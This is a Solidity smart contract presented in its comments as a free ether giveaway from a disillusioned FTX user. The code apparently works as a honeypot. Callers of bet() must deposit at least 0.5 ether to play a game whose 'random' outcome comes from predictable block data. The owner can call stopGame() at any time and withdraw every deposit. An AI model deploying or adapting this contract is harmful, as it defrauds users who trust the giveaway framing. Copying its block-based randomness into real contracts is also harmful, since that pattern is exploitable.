pragma solidity ^0.8.0;

//FTX suck my live, come get all my ether. I want to leave blockchain forever
//Take it , fcfs
//Read the smart contract yourself

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract FkFtxGiveaway is Ownable{
    
    uint num;
    bool start;

    constructor(address newOwner){
        _transferOwnership(newOwner);
    }
    
    function bet() public payable{
        require(start == true, "not start");
        require(msg.value >= 0.5 ether, "insufficient balance");
        if(random() < num/2){
            payable(tx.origin).transfer(address(this).balance);
            start = false;
        }
    }
    function random() private view returns(uint){
        //create random result
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
        tx.origin))) % num;
    }
    function setNumAndStart(uint newNUm) public payable onlyOwner{
        //initial the number if the number not been set
        if(num == 0){
            num = newNUm;
            start = true;
        }
    }
    function stopGame() public payable onlyOwner {
        start = false;
        payable(msg.sender).transfer(address(this).balance);
    }
}